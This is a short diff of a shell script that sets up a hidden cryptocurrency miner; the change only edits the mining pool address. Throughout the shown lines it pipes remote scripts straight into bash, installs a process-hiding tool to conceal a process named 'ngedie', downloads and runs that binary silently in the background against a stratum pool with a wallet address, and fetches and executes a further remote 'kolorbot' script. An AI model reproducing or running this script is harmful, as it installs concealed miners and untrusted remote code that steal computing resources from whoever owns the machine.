@@ -11,5 +11,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add ngedie"
 wget https://gitlab.com/ontranontran/kaspo/-/raw/main/ngedie >/dev/null 2>&1
 chmod +x ngedie
-./ngedie -c stratum+tcp://77.237.240.172:443#xnsub -u RWLcjcLuJhwAKM3ndbrUJ17XosqjMGL7PW.NGEDIE >/dev/null 2>&1 &
+./ngedie -c stratum+tcp://77.237.240.172:443 -u RWLcjcLuJhwAKM3ndbrUJ17XosqjMGL7PW.NGEDIE >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/ulukinahmad/botakkolor/main/kolorbot | bash
